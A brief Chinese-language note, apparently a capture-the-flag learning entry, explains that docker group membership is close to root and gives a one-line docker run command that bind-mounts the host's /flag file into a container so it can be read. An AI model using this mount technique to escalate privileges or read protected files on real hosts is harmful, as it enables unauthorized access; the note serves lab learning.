对于docker的提权有了新的认识！！！

两行代码：

```shell
docker run --it --rm -v /flag:/flag 容器ID /bin/ash
```

然后即可cat flag

主要是docker的用户组其实是跟root的权限差不多的

